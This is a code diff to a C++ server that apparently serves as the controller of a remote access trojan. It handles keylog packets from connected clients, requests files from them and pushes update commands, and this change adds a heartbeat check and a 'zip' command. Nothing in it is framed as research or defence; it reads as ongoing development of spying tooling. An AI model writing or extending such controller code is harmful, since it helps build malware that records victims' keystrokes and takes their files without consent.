@@ -128,7 +128,6 @@ bool Server::ProcessPacket(int ID, PacketType _packettype)
 
 		break;
 	}
-
 	case PacketType::Warning:
 	{
 		std::string message; //string to store our message we received
@@ -205,6 +204,15 @@ bool Server::ProcessPacket(int ID, PacketType _packettype)
 		std::cout << "Got file: " << connections[ID]->ifile.fileName << std::endl;
 		std::cout << CONSOLE_START;
 		fflush(NULL);
+		break;
+	}
+	case PacketType::Heartbeat:
+	{
+		std::string h;
+		if (!GetString(ID, h))
+			return false;
+		//std::cout << "Got heartbeat: " << h.c_str() << std::endl;
+		if (*(char*)h.c_str() != 'h') return false;
 		break;
 	}
 	case PacketType::Keylog:
@@ -358,6 +366,9 @@ void Server::ParseClientInput(std::string userinput, int& clientID)
 		}
 		else if (General::processParameter(userinput, "update")) {
 			SendString(clientID, userinput, PacketType::Update);
+		}
+		else if (General::processParameter(userinput, "zip")) {
+			SendString(clientID, userinput, PacketType::Zip);
 		}
 		else if (General::processParameter(userinput, "get")) {
 			RequestFile(clientID, userinput);
